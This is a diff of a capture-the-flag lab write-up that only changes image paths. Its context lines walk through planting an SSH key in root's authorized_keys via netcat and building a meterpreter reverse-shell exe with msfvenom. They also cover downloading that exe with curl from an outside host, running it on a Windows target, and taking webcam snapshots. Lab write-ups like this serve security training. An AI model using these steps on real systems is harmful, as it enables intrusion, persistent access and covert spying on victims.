@@ -680,7 +680,7 @@ And we have our flags for capt and root. Time for more enum.  Since we did not s
 
 ifconfig
 ls -la /root/.ssh
-![](/images/boykin_lab/71. ifconfig.png)
+![](/images/boykin_lab2/71. ifconfig.png)
 
 
 Public IP address:  165.227.86.197
@@ -690,13 +690,13 @@ In the /root/.ssh folder, we setup a nc listener that will directly append any d
 
 cd /root/.ssh
 nc -lvnp 17011 >> authorized_keys
-![](/images/boykin_lab/72. authorized_keys.png)
+![](/images/boykin_lab2/72. authorized_keys.png)
 
 
 On Kali, from the /root/.ssh folder, run the nc connection again:
 
 nc 165.227.86.197 < id_rsa.pub
-![](/images/boykin_lab/73. nc_file_transfer.png)
+![](/images/boykin_lab2/73. nc_file_transfer.png)
 
 
 Once you run the command on Kali and see the “Connection received” message on Target machine 3, you can Ctrl+c the nc running on Kali to close the connection.  In the above screenshot we also ran the “ls -la” command afterwards to show the file size changed on authorized_keys which lets us know the data was appended.  
@@ -704,7 +704,7 @@ Once you run the command on Kali and see the “Connection received” message o
 Now we can ssh directly to Target machine 3 from our Kali machine:
 
 ssh -i id_rsa root@165.227.86.197
-![](/images/boykin_lab/74. ssh.png)
+![](/images/boykin_lab2/74. ssh.png)
 
 
 Once we have access directly from our Kali machine, we can kill the other sessions by Ctrl+c and/or typing exit in the remaining terminal windows.
@@ -712,7 +712,7 @@ Once we have access directly from our Kali machine, we can kill the other sessio
 Now we can continue on with enumeration:
 
 netstat -ptuna
-![](/images/boykin_lab/75. netstat.png)
+![](/images/boykin_lab2/75. netstat.png)
 
 
 And here we see there are several ports listening on localhost (127.0.0.1) and running from ssh, which means they are likely ssh tunnel/port forwards to another machine.  At the end of this list we see a “Foreign Address” that is not one of the ones we previously saw in this lab, also connected via ssh: 70.242.177.5.  It is likely these port forwards are going to this machine, or at the very least have been initiated by this machine.
@@ -720,7 +720,7 @@ And here we see there are several ports listening on localhost (127.0.0.1) and r
 These ports are some common Windows ports, however working through them using nc does not yield anything of interest until:
 
 nc 127.0.0.1 5900
-![](/images/boykin_lab/76. nc_5900.png)
+![](/images/boykin_lab2/76. nc_5900.png)
 
 
 And we have what appears to be a user shell on Target machine 4, a Windows 10 machine.  
@@ -739,55 +739,55 @@ So far we have been working through Linux machines.  Target machine 4 represents
 First, let's gather some general information about the user we are logged in as and the system itself:
 
 whoami && hostname
-![](/images/boykin_lab/77. whoami.png)
+![](/images/boykin_lab2/77. whoami.png)
 
 
 systeminfo
-![](/images/boykin_lab/78. systeminfo.png)
+![](/images/boykin_lab2/78. systeminfo.png)
 
-![](/images/boykin_lab/78. systeminfo_2.png)
+![](/images/boykin_lab2/78. systeminfo_2.png)
 
 Next, let's take a look at some network related information to see our interfaces, IP addresses, and ports that are open or have connections:
 
 ipconfig /all
-![](/images/boykin_lab/79. ipconfig.png)
+![](/images/boykin_lab2/79. ipconfig.png)
 
 <trimmed>
-![](/images/boykin_lab/79. ipconfig_2.png)
+![](/images/boykin_lab2/79. ipconfig_2.png)
 
 
 curl ipinfo.io
-![](/images/boykin_lab/80. curl.png)
+![](/images/boykin_lab2/80. curl.png)
 
 
 netstat -ano
-![](/images/boykin_lab/81. netstat.png)
+![](/images/boykin_lab2/81. netstat.png)
 
 Finally, a bit more of a dive into our user's privileges, and simple command to see what other users may have accounts on this system before we begin digging through the directory structure for files of interest:
 
 whoami /all
-![](/images/boykin_lab/82. whoami.png)
+![](/images/boykin_lab2/82. whoami.png)
 
 
 net user
-![](/images/boykin_lab/83. net_user.png)
+![](/images/boykin_lab2/83. net_user.png)
 
 
 dir
-![](/images/boykin_lab/84. dir.png)
+![](/images/boykin_lab2/84. dir.png)
 
 
 type bindrun.bat
-![](/images/boykin_lab/85. type.png)
+![](/images/boykin_lab2/85. type.png)
 
 
 type Bindshell5900-2.ini
-![](/images/boykin_lab/85. type_2.png)
+![](/images/boykin_lab2/85. type_2.png)
 
 The above bindrun.bat and Bindshell5900-2.ini files are what establish and maintain the connection which allowed us to access this machine.  Here we have a hint to the directory “C:\tmp\tools” so let's see what is there:
 
 dir C:\tmp\tools
-![](/images/boykin_lab/86. dir.png)
+![](/images/boykin_lab2/86. dir.png)
 
 
 So after running the various commands above and searching through several directories (much of which was not shown) and even the tasklist, we see a directory of various tools, but we still really only have command line access through the nc connection.  We also confirmed the public IP address of Target machine 4 is 70.242.177.5.
@@ -801,19 +801,19 @@ LHOST is the IP address meterpreter will connect to, in this case the public IP 
 LPORT is the port meterpreter will connect to
 -f for fomat, in this case windows executable or exe
 and finally we redirect the output into a file named “win_the_war.exe”
-![](/images/boykin_lab/87. msfvenom.png)
+![](/images/boykin_lab2/87. msfvenom.png)
 
 
 For my setup, I connect from my home network to a VPN server I have set up on AWS.  From there I connect to the target, which means the public IP address the meterpreter needs to call back to is the AWS VPN public IP, not my home IP address.  So, I needed to set up ssh tunnels to direct the connection to my Kali machine.
 
 The first step was to open up a port on the AWS management console's security group, in this case 17011.
-![](/images/boykin_lab/88. aws.png)
+![](/images/boykin_lab2/88. aws.png)
 
 
 Next, to establish the tunnel from the AWS VPN server to my Kali VM.  The Kali side of the VPN connection is 192.168.17.2, while the AWS VPN server side is 192.168.17.1.  From a terminal window on the AWS VPN server:
 
 sudo ssh -fN -L 0.0.0.0:17011:0.0.0.0:17011 root@192.168.17.2
-![](/images/boykin_lab/89. ssh_tunnel.png)
+![](/images/boykin_lab2/89. ssh_tunnel.png)
 
 
 This establishes a listener on the AWS server on port 17011 which forwards any traffic received there through the ssh connection over the VPN interface to my local Kali machine (192.168.17.2) to port 17011 which is where I will have my msfconsole listening.
@@ -821,32 +821,32 @@ This establishes a listener on the AWS server on port 17011 which forwards any t
 Next I ran a python http server on my Kali machine from the directory where the meterpreter reverse shell.exe was located:
 
 python3 -m http.server 17011
-![](/images/boykin_lab/90. python_http.png)
+![](/images/boykin_lab2/90. python_http.png)
 
 
 On Target machine 4, I used curl to download the exe, in this case win_the_war.exe
 
 curl -o win_the_war.exe http://52.12.133.246:17011/win_the_war.exe
-![](/images/boykin_lab/91. curl.png)
+![](/images/boykin_lab2/91. curl.png)
 
 
 Once downloaded successfully, we can kill (Ctrl + c) the python http server.
-![](/images/boykin_lab/92. python_http.png)
+![](/images/boykin_lab2/92. python_http.png)
 
 
 Next we fire up msfconsole and set up our multi handler to listen on port 17011 to catch the reverse shell connection.
 
 msfconsole
 use exploit/multi/handler
-![](/images/boykin_lab/93. msfconsole.png)
+![](/images/boykin_lab2/93. msfconsole.png)
 
-![](/images/boykin_lab/93. msfconsole_2.png)
+![](/images/boykin_lab2/93. msfconsole_2.png)
 
 
 I have modified my msf prompt from the default to show information I wish to see. Do not worry if yours looks slightly different.
 
 show options
-![](/images/boykin_lab/94. options.png)
+![](/images/boykin_lab2/94. options.png)
 
 
 Here we need to set LHOST, LPORT, and also the payload which is defaulting to “generic/shell_reverse_tcp” but needs to be set to a meterpreter one:
@@ -854,44 +854,44 @@ Here we need to set LHOST, LPORT, and also the payload which is defaulting to �
 set LHOST 0.0.0.0
 set LPORT 17011
 set payload windows/meterpreter/reverse_tcp
-![](/images/boykin_lab/95. set.png)
+![](/images/boykin_lab2/95. set.png)
 
 
 Now to confirm the options are set, we show options one more time:
 
 show options
-![](/images/boykin_lab/96. options.png)
+![](/images/boykin_lab2/96. options.png)
 
 
 Now we run the handler to start it:
 
 run
-![](/images/boykin_lab/97. run.png)
+![](/images/boykin_lab2/97. run.png)
 
 
 Once multi handler is ready, on the Windows target we execute win_the_war.exe, using “start /B" to run it in the background in case anything goes wrong it should not cause our nc connection to hang:
 
 start /B win_the_war.exe
-![](/images/boykin_lab/98. start.png)
+![](/images/boykin_lab2/98. start.png)
 
 
 In your msfconsole window you should see a connection and a meterpreter session opened!
-![](/images/boykin_lab/99. meterpreter.png)
+![](/images/boykin_lab2/99. meterpreter.png)
 
 
 Next for the webcam shot. In our meterpreter session we run the following commands to first list the webcams available and then take a screen grab from each one:
 
 webcam_list
-![](/images/boykin_lab/100. webcam.png)
+![](/images/boykin_lab2/100. webcam.png)
 
 
 webcam_snap -i 1
 webcam_snap -i 2
-![](/images/boykin_lab/101. webcam_snap.png)
+![](/images/boykin_lab2/101. webcam_snap.png)
 
 
 webcam_snap -i 2 should be successful, and you have the final flag:
-![](/images/boykin_lab/102. final_flag.png)
+![](/images/boykin_lab2/102. final_flag.png)
 
 
 As of mid-September 2020, this concludes the lab.  But wait, what happened to 10.136.0.5?  We saw it on our initial ping scan from 10.136.0.2, but never exploited it.  As of this writing, 10.136.0.5 was a salt-minion which could be exploited using the same technique (python3 reverse shell).  However, it was not configured with additional challenges or flags for the lab so I did not show any of the steps or settings on it in this write up in case CaptBoykin decides to incorporate it into the lab in the future.
